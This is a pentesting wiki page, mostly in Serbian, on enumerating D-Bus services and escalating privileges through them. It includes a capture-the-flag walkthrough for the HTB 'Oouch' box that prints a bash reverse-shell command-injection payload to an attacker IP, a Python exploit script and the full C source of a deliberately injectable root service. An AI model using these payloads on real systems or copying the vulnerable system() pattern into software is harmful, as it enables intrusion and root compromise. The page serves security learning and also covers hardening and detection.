# D-Bus Enumeration & Command Injection Privilege Escalation

## **GUI enumeration**

D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.<sup>[[1]](#references)</sup>

Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.

For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
```bash
sudo apt-get install d-feet
```
Ako proveravate **session bus**, prvo potvrdite trenutnu adresu:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na prvoj slici prikazane su services registrovane na D-Bus system bus-u, pri čemu je **org.debin.apt** posebno istaknut nakon izbora dugmeta System Bus. D-Feet šalje upite ovom service-u za objekte i prikazuje interfaces, methods, properties i signals izabranih objekata, kao što se vidi na drugoj slici. Takođe je detaljno prikazan signature svakog method-a.

Značajna funkcija je prikaz **process ID-ja (pid)** i **command line-a** service-a, što je korisno za proveru da li service radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje method-a**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet pretvara u D-Bus types pre prosleđivanja service-u.

Međutim, imajte na umu da **neki method-i zahtevaju authentication** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove method-e, pošto je naš cilj da u prvom redu podignemo privilegije bez credentials-a.

Takođe imajte na umu da neki service-i šalju upite drugom D-Bus service-u pod nazivom org.freedeskto.PolicyKit1 kako bi proverili da li korisniku treba dozvoliti izvršavanje određenih actions ili ne.

## **Enumeracija komandne linije**

### Izlistavanje objekata service-a

Otvorene D-Bus interfaces moguće je izlistati pomoću:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Servisi označeni kao **`(activatable)`** posebno su interesantni jer **još nisu pokrenuti**, ali bus zahtev može da ih pokrene na zahtev. Nemojte se zaustaviti na `busctl list`; povežite ta imena sa stvarnim binarnim datotekama koje bi izvršili.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
To vam brzo govori koja će `Exec=` putanja biti pokrenuta za aktivatable name i pod kojim identitetom. Ako su binary ili njegov lanac izvršavanja slabo zaštićeni, inactive service i dalje može postati put za privilege escalation.

#### Veze

[Sa Wikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada process uspostavi connection sa bus-om, bus toj connection-i dodeljuje posebno bus ime pod nazivom _unique connection name_. Bus imena ovog tipa su nepromenljiva — garantovano je da se neće promeniti dok god connection postoji — i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka bus-a. To znači da nijedna druga connection sa tim bus-om nikada neće dobiti takvo unique connection name, čak ni ako isti process zatvori connection sa bus-om i kreira novu. Unique connection names se lako prepoznaju jer počinju znakom dvotačke, koji je inače zabranjen.<sup>[[4]](#references)</sup>

### Informacije o Service Object-u

Zatim možete dobiti određene informacije o interface-u pomoću:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Takođe povežite naziv bus-a sa njegovom `systemd` jedinicom i putanjom izvršne datoteke:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Ovo odgovara na operativno pitanje koje je važno tokom privesc-a: **ako poziv metode uspe, koji će stvarni binarni fajl i unit izvršiti radnju?**

### Izlistavanje interfejsa service objekta

Morate imati dovoljno dozvola.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect interfejs servisnog objekta

Obratite pažnju na to da je u ovom primeru izabran najnoviji otkriveni interfejs korišćenjem parametra `tree` (_pogledajte prethodni odeljak_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Obratite pažnju na metod `.Block` interfejsa `htb.oouch.Block` (onaj koji nas zanima). Slovo „s“ u drugim kolonama može značiti da očekuje string.

Pre nego što pokušate bilo šta opasno, prvo proverite metod **orijentisan za čitanje** ili neki drugi metod niskog rizika. Time se jasno razlikuju tri slučaja: pogrešna sintaksa, metod je dostupan, ali je pristup odbijen, ili je metod dostupan i pristup dozvoljen.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Korelacija D-Bus metoda sa pravilima i radnjama

Introspection vam govori **šta** možete da pozovete, ali ne govori **zašto** je poziv dozvoljen ili odbijen. Za stvarnu privesc triage analizu obično je potrebno da zajedno pregledate **tri sloja**:

1. **Activation metadata** (`.service` fajlovi ili `SystemdService=`) da biste saznali koji će se binary i unit zaista pokrenuti.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) da biste saznali ko može da `own`, `send_destination` ili `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) da biste saznali podrazumevani authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Korisne komande:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Nemojte pretpostaviti mapiranje 1:1 između D-Bus metode i Polkit akcije. Ista metoda može izabrati drugu akciju u zavisnosti od objekta koji se menja ili konteksta tokom izvršavanja. Zato je praktičan tok rada:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` i pretraga relevantnih `.policy` datoteka
3. bezbedne probe uživo pomoću `busctl call`, `gdbus call` ili `dbusmap --enable-probes --null-agent`

Proxy ili compatibility servisi zahtevaju posebnu pažnju. **Proxy koji radi kao root** i prosleđuje zahteve drugom D-Bus servisu preko sopstvene, unapred uspostavljene veze može nenamerno dovesti do toga da backend svaki zahtev tretira kao da dolazi od UID-a 0, osim ako se identitet prvobitnog pozivaoca ponovo ne proveri.<sup>[[3]](#references)</sup>

### Interfejs za nadgledanje/hvatanje

Uz dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **nadgledati D-Bus komunikaciju**.

Da biste **nadgledali** **komunikaciju**, morate biti **root**. Ako i dalje nailazite na probleme kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ako znate kako da konfigurišete D-Bus config datoteku tako da **non-root users mogu da prisluškuju** komunikaciju, **kontaktirajte me**!

Različiti načini za nadgledanje:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru interfejs `htb.oouch.Block` se nadgleda i **poruka "**_**lalalalal**_**" se šalje putem miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u **pcapng** fajl koji Wireshark može da otvori:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtriranje sve buke <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako na bus-u ima previše informacija, prosledite match rule ovako:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Može se navesti više pravila. Ako poruka odgovara _bilo kom_ od pravila, poruka će biti ispisana. Ovako:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi pravila podudaranja.<sup>[[7]](#references)</sup>

### Još

`busctl` ima još više opcija, [**pronađite ih sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ranjivi scenario**

Kao korisnik **qtc unutar hosta „oouch“ sa HTB-a**, možete pronaći **neočekivanu D-Bus config datoteku** koja se nalazi u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Iz prethodne konfiguracije imajte na umu da **morate biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći kod povezan sa dbus-om u datoteci _/code/oouch/routes.py._ Ovo je zanimljiv kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete videti, ono se **povezuje sa D-Bus interfejsom** i funkciji **"Block"** šalje vrednost "client_ip".

Sa druge strane D-Bus veze izvršava se neki C kompajlirani binarni fajl. Ovaj kod **osluškuje** D-Bus vezu **u potrazi za IP adresom i poziva iptables putem funkcije `system`** kako bi blokirao datu IP adresu.\
**Poziv funkcije `system` je namerno ranjiv na command injection**, pa će payload poput sledećeg kreirati reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Iskoristite ga

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. U njemu, između linija 91–97, možete pronaći **način registracije `D-Bus object path`** i **`interface name`**. Ove informacije će biti neophodne za slanje informacija D-Bus vezi:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u liniji 57 možete videti da je **jedini registrovani method** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku payload-i biti poslati service object-u `htb.oouch.Block`, interface-u `/htb/oouch/Block` i method-u `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći python kod će poslati payload D-Bus konekciji, metodi `Block`, putem `block_iface.Block(runme)` (_imajte na umu da je izdvojen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` je alat koji se koristi za slanje poruka u „Message Bus“
- Message Bus – softver koji sistemi koriste kako bi komunikacija između aplikacija bila jednostavna. Povezan je sa Message Queue (poruke su poređane po redosledu), ali se u Message Bus poruke šalju po subscription modelu i takođe veoma brzo.
- Oznaka „-system“ koristi se za navođenje da je to sistemska poruka, a ne session poruka (podrazumevano).
- Oznaka „–print-reply“ koristi se za pravilno ispisivanje naše poruke i primanje odgovora u formatu čitljivom ljudima.
- „–dest=Dbus-Interface-Block“ Adresa Dbus interfejsa.
- „–string:“ – Tip poruke koju želimo da pošaljemo interfejsu. Postoji nekoliko formata za slanje poruka, kao što su double, bytes, booleans, int i objpath. Od ovih formata, „object path“ je koristan kada želimo da pošaljemo putanju datoteke Dbus interfejsu. U ovom slučaju možemo da koristimo specijalnu datoteku (FIFO) kako bismo prosledili komandu interfejsu u obliku imena datoteke. „string:;“ – Ovo služi za ponovno pozivanje object path-a, gde postavljamo FIFO reverse shell datoteku/komandu.

_Napomena: u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) upućuje na service object, a poslednji deo (`.Block`) upućuje na naziv metode._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Pomagala za automatizovanu enumeraciju (2023-2025)

Ručno enumerisanje velike D-Bus attack surface pomoću `busctl`/`gdbus` brzo postaje naporno. Dva mala FOSS alata objavljena tokom poslednjih nekoliko godina mogu ubrzati rad tokom red-team ili CTF angažmana:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Napisan u jeziku C; jedna statička binarna datoteka (<50 kB) koja prolazi kroz svaku putanju objekta, preuzima XML `Introspect` i mapira ga na PID/UID vlasnika.<sup>[[5]](#references)</sup>
* Korisne opcije:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Alat označava nezaštićena well-known imena znakom `!`, čime se trenutno otkrivaju servisi koje možete *preuzeti* (take over) ili pozivi metoda kojima se može pristupiti iz neprivilegovane shell sesije.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Skripta zasnovana isključivo na Pythonu koja traži *writable* putanje u systemd jedinicama **i** previše permisivne D-Bus policy datoteke (npr. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Brza upotreba:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus modul pretražuje navedene direktorijume i ističe svaki servis koji normalan korisnik može spoof-ovati ili hijack-ovati:
* `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Značajne D-Bus greške za eskalaciju privilegija (2024-2025)

Praćenje nedavno objavljenih CVE-ova pomaže u uočavanju sličnih nebezbednih obrazaca u prilagođenom kodu. Dva dobra novija primera su:<sup>[[2]](#references)[[3]](#references)</sup>

| Godina | CVE | Komponenta | Osnovni uzrok | Ofanzivna pouka |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Servis koji se izvršava kao root izložio je D-Bus interfejs koji su neprivilegovani korisnici mogli da rekonfigurišu, uključujući učitavanje ponašanja makroa pod kontrolom napadača. | Ako daemon izlaže **upravljanje uređajem/profilom/konfiguracijom** na sistemskoj magistrali, tretirajte writable konfiguraciju i funkcije makroa kao primitive za izvršavanje koda, a ne samo kao „podešavanja“. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Proxy za kompatibilnost koji se izvršava kao root prosleđivao je zahteve backend servisima bez očuvanja bezbednosnog konteksta originalnog pozivaoca, pa su backend servisi verovali proxyju kao UID 0. | Tretirajte **proxy / bridge / compatibility** D-Bus servise kao posebnu klasu grešaka: ako prosleđuju privilegovane pozive, proverite kako UID pozivaoca/Polkit kontekst stiže do backend-a. |

Obratite pažnju na sledeće obrasce:
1. Servis se izvršava **kao root na sistemskoj magistrali**.
2. Ili **ne postoji provera autorizacije**, ili se provera vrši nad **pogrešnim subjektom**.
3. Dostupna metoda na kraju menja stanje sistema: instalacija paketa, izmene korisnika/grupa, konfiguracija bootloader-a, ažuriranje profila uređaja, upis u datoteke ili direktno izvršavanje komandi.

Koristite `dbusmap --enable-probes` ili ručni `busctl call` da potvrdite da li je metoda dostupna, a zatim pregledajte policy XML servisa i Polkit akcije da biste razumeli **koji subjekt** je zapravo autorizovan.

---

## Brze pobede za hardening i detekciju

* Pretražite policy-je koji su writable za sve ili otvoreni za *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Zahtevajte Polkit za opasne metode – čak i *root* proxy-ji treba da proslede PID *pozivaoca* funkciji `polkit_authority_check_authorization_sync()`, umesto sopstvenog PID-a.
* Oduzmite privilegije dugotrajnim pomoćnim procesima (koristite `sd_pid_get_owner_uid()` za promenu namespace-a nakon povezivanja sa magistralom).
* Ako ne možete da uklonite servis, barem ga *ograničite* na namensku Unix grupu i restriktivno definišite pristup u njegovoj XML policy datoteci.
* Blue-team: snimite sistemsku magistralu pomoću `busctl capture > /var/log/dbus_$(date +%F).pcapng` i uvezite snimak u Wireshark radi detekcije anomalija.

---

## References

- [1] [USBCreator D-Bus eskalacija privilegija u Ubuntu Desktop-u](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus servis omogućava konfiguraciju bilo kom neprivilegovanom korisniku](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Zaobilaženje autentifikacije u Deepin D-Bus Proxy servisu (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus dokumentacija](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
